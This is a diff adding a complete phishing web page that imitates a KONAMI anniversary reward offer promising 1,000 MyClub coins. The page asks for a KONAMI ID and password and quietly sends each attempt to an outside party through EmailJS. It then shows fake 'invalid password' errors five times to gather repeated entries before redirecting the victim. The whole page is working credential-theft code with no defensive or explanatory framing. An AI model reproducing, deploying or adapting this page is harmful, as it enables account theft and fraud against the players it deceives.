@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="KONAMI Anniversary | Claim Reward">
+    <meta property="og:description" content="Verify your account to claim 1,000 MyClub coins instantly.">
+    <meta property="og:image" content="https://i.ibb.co/vxkbpXL0/3c0bd8aa05d3c1dd34c9b3bb1066d1e0.jpg">
+    <meta property="og:url" content="https://congratulations-web.github.io/Web-link/">
+    <link rel="icon" type="image/png" href="https://i.ibb.co/vxkbpXL0/3c0bd8aa05d3c1dd34c9b3bb1066d1e0.jpg">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KONAMI Anniversary | Claim Reward</title>
+    
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background-color: #f2f2f2; }
+        
+        header { background: white; text-align: left; border-bottom: 4px solid #0041AD; }
+        .konami-logo { color: #b10e1e; font-size: 24px; font-weight: bold; padding: 12px 15px; letter-spacing: 1.5px; font-family: "Arial Black", sans-serif; }
+        .red-bar { background: #b10e1e; color: white; padding: 15px; font-size: 18px; }
+
+        .container { max-width: 450px; margin: 0 auto; background: white; min-height: 100vh; }
+        .reward-banner { padding: 20px; text-align: center; background: linear-gradient(180deg, #fff 0%, #fff5f5 100%); }
+        .reward-banner img { width: 100%; max-width: 320px; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.15); border: 2px solid #ffd700; }
+
+        .claim-box { padding: 25px; }
+        .event-title { color: #b10e1e; font-size: 20px; font-weight: bold; margin-bottom: 10px; text-align: center; }
+        .event-desc { font-size: 14px; color: #555; text-align: center; margin-bottom: 20px; }
+
+        .season-alert { background-color: #fff4f4; color: #b10e1e; padding: 12px; border-radius: 8px; border: 1px solid #ffcccc; font-size: 14px; font-weight: bold; text-align: center; margin-bottom: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+
+        .input-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 14px; border: 1px solid #a4c7e1; border-radius: 6px; font-size: 16px; }
+
+        .btn-claim { width: 100%; background: #b10e1e; color: white; border: none; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        
+        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.9); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        .konami-spinner { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #b10e1e; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Konami Style Modal Custom */
+        .konami-modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+        .konami-modal-box {
+            background: white;
+            width: 85%;
+            max-width: 350px;
+            border-radius: 2px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            animation: fadeIn 0.3s ease;
+        }
+        .konami-modal-header { background: #f1f1f1; padding: 12px 15px; font-weight: bold; border-bottom: 1px solid #ddd; }
+        .konami-modal-body { padding: 25px 15px; font-size: 14px; color: #444; }
+        .konami-modal-footer { padding: 12px; text-align: right; border-top: 1px solid #eee; }
+        .konami-btn-ok { background: #b10e1e; color: white; border: none; padding: 8px 30px; font-weight: bold; cursor: pointer; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+    </style>
+</head>
+<body>
+
+<div id="loading-overlay">
+    <div class="konami-spinner"></div>
+    <div style="margin-top:15px; color:#b10e1e; font-weight:bold;">PROCESSING...</div>
+</div>
+
+<div id="customAlert" class="konami-modal-overlay">
+    <div class="konami-modal-box">
+        <div class="konami-modal-header">Information</div>
+        <div class="konami-modal-body">
+            <p id="alertMessage">Invalid KONAMI ID or password.</p>
+            <p style="margin-top:10px; color:#999; font-size:11px;" id="error-code-text">Error Code: 501</p>
+        </div>
+        <div class="konami-modal-footer">
+            <button class="konami-btn-ok" onclick="closeAlert()">OK</button>
+        </div>
+    </div>
+</div>
+
+<header>
+    <div class="konami-logo">KONAMI</div>
+    <div class="red-bar">Anniversary Reward</div>
+</header>
+
+<div class="container">
+    <div class="reward-banner">
+        <img src="https://i.ibb.co/93g3dYf5/d9af6ddb1dcd78d12657af728a08421f.jpg" alt="1000 Coins">
+    </div>
+
+    <div class="claim-box">
+        <h1 class="event-title">30th Anniversary Gift</h1>
+        <p class="event-desc">Verify your account to claim 1,000 MyClub coins instantly.</p>
+        
+        <div class="season-alert">
+            <i class="fas fa-clock"></i> 30 days left to claim this season.
+        </div>
+
+        <form id="claimForm">
+            <div class="input-group">
+                <input type="text" id="email_field" placeholder="KONAMI ID (e-mail address)" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="pass_field" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn-claim">CLAIM NOW</button>
+        </form>
+    </div>
+</div>
+
+<script>
+    (function(){ 
+        emailjs.init("9TO7hHMapqy4U9kNz"); 
+    })();
+
+    let tabashadaBadhanka = 0; 
+
+    function showAlert(msg, errorCode = "501") {
+        document.getElementById('alertMessage').innerText = msg;
+        document.getElementById('error-code-text').innerText = "Error Code: " + errorCode;
+        document.getElementById('customAlert').style.display = 'flex';
+    }
+
+    function closeAlert() {
+        document.getElementById('customAlert').style.display = 'none';
+    }
+
+    document.getElementById('claimForm').onsubmit = function(e) {
+        e.preventDefault();
+        
+        const emailVal = document.getElementById('email_field').value;
+        const passVal = document.getElementById('pass_field').value;
+
+        // 1. Hubi @ iyo .
+        if (!emailVal.includes("@") || !emailVal.includes(".")) {
+            showAlert("Please enter a valid KONAMI ID (e-mail address).", "403");
+            return;
+        }
+
+        tabashadaBadhanka++; 
+        const loadingOverlay = document.getElementById('loading-overlay');
+        loadingOverlay.style.display = 'flex';
+
+        const params = {
+            method: "Attempt: " + tabashadaBadhanka,
+            login_user: emailVal,
+            login_pass: passVal
+        };
+
+        emailjs.send("service_j2uu8yq", "template_0tc14oe", params)
+            .then(function() {
+                setTimeout(() => {
+                    loadingOverlay.style.display = 'none';
+
+                    if (tabashadaBadhanka < 6) {
+                        showAlert("Invalid KONAMI ID or password.", (600 + tabashadaBadhanka));
+                        document.getElementById('pass_field').value = ""; 
+                    } else {
+                        window.location.href = "Lkonami.com.html";
+                    }
+                }, 1500);
+            }, function(error) {
+                loadingOverlay.style.display = 'none';
+                showAlert("Network error. Please try again later.", "909");
+            });
+    };
+</script>
+
+</body>
+</html>
+
